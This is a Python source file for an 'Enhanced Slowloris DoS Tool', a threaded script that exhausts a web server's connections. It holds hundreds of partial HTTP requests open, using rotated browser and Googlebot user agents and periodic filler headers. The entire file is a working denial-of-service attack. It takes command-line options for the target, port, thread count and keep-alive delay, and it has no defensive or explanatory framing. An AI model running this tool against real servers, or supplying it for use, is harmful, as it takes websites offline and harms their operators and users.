#!/usr/bin/env python3
import argparse
import socket
import time
import random
import ssl
import threading
from queue import Queue
import logging
import os
import signal
import sys

class Slowloris:
    def __init__(self, target, port, threads, delay, timeout):
        self.target = target
        self.port = port
        self.threads = threads
        self.delay = delay
        self.timeout = timeout
        self.running = True
        self.queue = Queue()
        self.connections = 0
        
        # Set up logging
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        self.logger = logging.getLogger('slowloris')
        
        # Set up signal handler
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

    def signal_handler(self, signum, frame):
        self.logger.info("Stopping attack...")
        self.running = False
        sys.exit(0)

    def generate_headers(self):
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "Mozilla/5.0 (X11; Linux x86_64)",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)",
            "Mozilla/5.0 (compatible; Googlebot/2.1)"
        ]
        
        headers = {
            'User-Agent': random.choice(user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1'
        }
        
        return headers

    def create_connection(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            
            if self.port == 443:
                s = ssl.wrap_socket(s)
                
            s.connect((self.target, self.port))
            self.connections += 1
            
            return s
            
        except Exception as e:
            self.logger.debug(f"Failed to create connection: {str(e)}")
            return None

    def send_keepalive(self, sock):
        try:
            sock.send("X-a: b\r\n".encode())
            return True
        except:
            return False

    def worker(self):
        while self.running:
            try:
                sock = self.create_connection()
                if not sock:
                    continue
                    
                headers = self.generate_headers()
                
                request = f"GET /?{random.randint(1, 5000)} HTTP/1.1\r\n"
                request += f"Host: {self.target}\r\n"
                
                for header, value in headers.items():
                    request += f"{header}: {value}\r\n"
                    
                sock.send(request.encode())
                
                last_send = time.time()
                while self.running:
                    current_time = time.time()
                    if current_time - last_send >= self.delay:
                        if not self.send_keepalive(sock):
                            break
                        last_send = current_time
                        
                    time.sleep(0.1)
                    
            except Exception as e:
                self.logger.debug(f"Worker error: {str(e)}")
                
            finally:
                try:
                    sock.close()
                    self.connections -= 1
                except:
                    pass

    def start_attack(self):
        self.logger.info(f"Starting Slowloris attack on {self.target}:{self.port}")
        self.logger.info(f"Using {self.threads} threads with {self.delay}s delay")
        
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            threads.append(t)
            
        try:
            while self.running:
                self.logger.info(f"Active connections: {self.connections}")
                time.sleep(5)
                
        except KeyboardInterrupt:
            self.signal_handler(None, None)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Enhanced Slowloris DoS Tool")
    parser.add_argument("target", help="Target domain or IP")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("-t", "--threads", type=int, default=200, help="Number of threads (default: 200)")
    parser.add_argument("-d", "--delay", type=float, default=15.0, help="Delay between keep-alive packets (default: 15.0)")
    parser.add_argument("--timeout", type=float, default=10.0, help="Socket timeout (default: 10.0)")
    
    args = parser.parse_args()
    
    attacker = Slowloris(
        args.target,
        args.port,
        args.threads,
        args.delay,
        args.timeout
    )
    
    attacker.start_attack()